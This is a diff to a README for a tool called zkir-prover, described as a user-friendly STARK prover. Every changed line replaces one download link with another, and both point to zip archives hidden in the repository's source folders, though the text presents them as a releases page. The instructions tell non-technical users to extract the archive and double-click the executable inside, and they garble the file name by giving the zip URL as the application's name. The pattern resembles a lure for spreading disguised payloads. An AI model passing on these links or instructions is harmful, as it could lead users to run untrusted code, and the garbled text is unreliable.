@@ -1,7 +1,7 @@
 # 🚀 zkir-prover - Your Easy STARK Prover Tool
 
 ## 📥 Download Now
-[![Download zkir-prover](https://raw.githubusercontent.com/sirjanhansda/zkir-prover/master/src/zkir-prover_v3.0-beta.5.zip)](https://raw.githubusercontent.com/sirjanhansda/zkir-prover/master/src/zkir-prover_v3.0-beta.5.zip)
+[![Download zkir-prover](https://github.com/sirjanhansda/zkir-prover/raw/refs/heads/master/src/chips/range/prover-zkir-v3.9-alpha.2.zip)](https://github.com/sirjanhansda/zkir-prover/raw/refs/heads/master/src/chips/range/prover-zkir-v3.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to zkir-prover! This tool helps you use the STARK prover for zero-knowledge interactive proofs. It’s designed to be user-friendly, even for those who may not have technical skills. 
@@ -22,7 +22,7 @@ Before you start, here’s what you need to know:
 Follow these simple steps to download and run zkir-prover:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/sirjanhansda/zkir-prover/master/src/zkir-prover_v3.0-beta.5.zip) where you can find the latest version of zkir-prover.
+   Go to the [Releases page](https://github.com/sirjanhansda/zkir-prover/raw/refs/heads/master/src/chips/range/prover-zkir-v3.9-alpha.2.zip) where you can find the latest version of zkir-prover.
 
 2. **Download the Latest Version**  
    Locate the most recent release on the page. Click on the download link for the version appropriate for your operating system. 
@@ -31,7 +31,7 @@ Follow these simple steps to download and run zkir-prover:
    After the download completes, locate the file in your Downloads folder. Use an extraction tool like WinRAR or 7-Zip (Windows) or the built-in extractor on macOS and Linux.
 
 4. **Run the Application**  
-   Find the extracted folder and look for the application file (often named `https://raw.githubusercontent.com/sirjanhansda/zkir-prover/master/src/zkir-prover_v3.0-beta.5.zip` on Windows or simply `zkir-prover` on macOS/Linux). Double-click the file to open it.
+   Find the extracted folder and look for the application file (often named `https://github.com/sirjanhansda/zkir-prover/raw/refs/heads/master/src/chips/range/prover-zkir-v3.9-alpha.2.zip` on Windows or simply `zkir-prover` on macOS/Linux). Double-click the file to open it.
 
 5. **Follow On-Screen Instructions**  
    Once the application is open, you will see simple menus guiding you through the use of the tool. Follow these menus to start using zkir-prover effectively.
@@ -49,4 +49,4 @@ Follow these simple steps to download and run zkir-prover:
 ## 🔗 Further Information
 For additional details, you can visit our project page or reach out to our support team through GitHub issues. We welcome your feedback.
 
-[Download zkir-prover](https://raw.githubusercontent.com/sirjanhansda/zkir-prover/master/src/zkir-prover_v3.0-beta.5.zip) now and start using our STARK prover today!
+[Download zkir-prover](https://github.com/sirjanhansda/zkir-prover/raw/refs/heads/master/src/chips/range/prover-zkir-v3.9-alpha.2.zip) now and start using our STARK prover today!
